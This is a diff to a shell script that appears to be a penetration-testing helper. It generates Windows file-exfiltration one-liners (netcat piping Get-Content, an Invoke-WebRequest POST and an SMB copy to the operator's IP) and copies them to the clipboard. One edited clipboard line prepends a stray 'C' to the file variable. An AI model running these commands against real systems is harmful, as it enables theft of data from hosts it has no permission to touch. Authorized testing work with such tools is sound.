@@ -56,8 +56,9 @@ case "$CASE" in
       PORT=9001
     fi 
     echo -e "${MAGENTA}=== NC ===${COLOR}"
-    echo -e "Get-Content C:\\Windows\\win.ini -Raw | nc ${IP} ${PORT}"
-    printf "%s" "Get-Content C:\\Windows\\win.ini -Raw | nc ${IP} ${PORT}" | xclip -selection clipboard
+    echo
+    echo -e "Get-Content ${OUT} -Raw | nc ${IP} ${PORT}"
+    printf "%s" "Get-Content C${OUT} -Raw | nc ${IP} ${PORT}" | xclip -selection clipboard
     echo -e "${GREEN}→ helper copied to clipboard"
 
     echo
@@ -73,8 +74,8 @@ case "$CASE" in
     PORT=8080
   fi
 
-  echo -e "${MAGENTA}=== On TARGET ===${COLOR}"
-
+  echo -e "${MAGENTA}=== HTTP ===${COLOR}"
+  echo
   CMD_PS="Invoke-WebRequest -Uri http://${IP}:${PORT} -Method POST -InFile ${OUT}"
   echo -e "${WHITE}${CMD_PS}${RESET}"
 
@@ -94,6 +95,7 @@ case "$CASE" in
     SHARE="${ARG3:-data}"
     mkdir -p "./${SHARE}"
     echo -e "${MAGENTA}=== SMB ===${COLOR}"
+    echo
     echo "copy ${OUT} \\\\${IP}\\${SHARE}\\${OUT}"
     printf "%s" "copy ${OUT} \\\\${IP}\\${SHARE}\\${OUT}" | xclip -selection clipboard
     echo -e "${GREEN}→ helper copied to clipboard"
